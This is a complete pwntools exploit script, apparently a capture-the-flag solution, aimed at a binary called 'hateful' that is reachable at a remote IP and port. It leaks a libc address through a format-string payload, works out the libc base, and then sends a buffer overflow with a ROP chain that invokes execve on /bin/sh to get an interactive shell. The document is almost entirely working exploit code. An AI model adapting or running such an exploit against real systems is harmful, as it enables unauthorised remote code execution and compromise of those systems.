#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./hateful")
libc = ELF("./libc.so.6")
rop_libc = ROP(libc)

if args.REMOTE:
    p = remote("52.59.124.14", 5020)
else:
    p = process(elf.path)

    gdbscript = """
    c
    """
    gdb.attach(p, gdbscript=gdbscript)

# Dummy
p.sendlineafter(b">> ", b"yay")

# Format String to leak LIBC
p.sendlineafter(b">> ", b"%117$p")
libc_leak = p.recvline_startswith(b"email provided: ").decode(errors="ignore")
libc_leak = int(libc_leak.split(": ")[1], 16)
info(f"LIBC LEAK: 0x{libc_leak:02X}")

# Calculate LIBC address
libc.address = libc_leak - 528325
info(f"LIBC ADDRESS: 0x{libc.address:02X}")

# ROP
pop_rax = rop_libc.find_gadget(["pop rax", "ret"]).address + libc.address
bin_sh = next(libc.search(b"/bin/sh\x00"))
pop_rdi = rop_libc.find_gadget(["pop rdi", "ret"]).address + libc.address
pop_rsi = rop_libc.find_gadget(["pop rsi", "ret"]).address + libc.address
pop_rdx = rop_libc.find_gadget(["pop rdx", "ret"]).address + libc.address
syscall = rop_libc.find_gadget(["syscall", "ret"]).address + libc.address

# Buffer Overflow
payload = b"A" * 1016

payload += p64(pop_rax)
payload += p64(0x3B)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rsi)
payload += p64(0x00)
payload += p64(pop_rdx)
payload += p64(0x00)
payload += p64(syscall)

p.sendlineafter(b"message!\n", payload)

p.interactive()
